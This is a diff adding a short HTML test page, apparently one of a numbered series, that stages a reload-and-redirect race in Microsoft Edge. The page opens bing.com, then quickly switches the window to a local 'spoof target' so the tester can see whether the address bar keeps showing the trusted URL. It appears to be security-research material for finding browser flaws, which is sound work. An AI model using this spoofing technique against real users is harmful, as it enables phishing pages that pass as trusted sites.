@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Edge redirect+reload race</title></head>
+<body>
+<h3>Edge #9: Redirect + reload race</h3>
+<p>Klik tombol. Buka window, reload + redirect bersamaan. Perhatikan address bar.</p>
+<button onclick="go()">Mulai</button>
+<script>
+function go(){
+  var w = window.open("https://www.bing.com/", "_blank");
+  setTimeout(function(){ try { w.location.reload(); } catch(e){} }, 50);
+  setTimeout(function(){ try { w.location = "edge-spoof-target.html"; } catch(e){} }, 150);
+}
+</script>
+</body>
+</html>
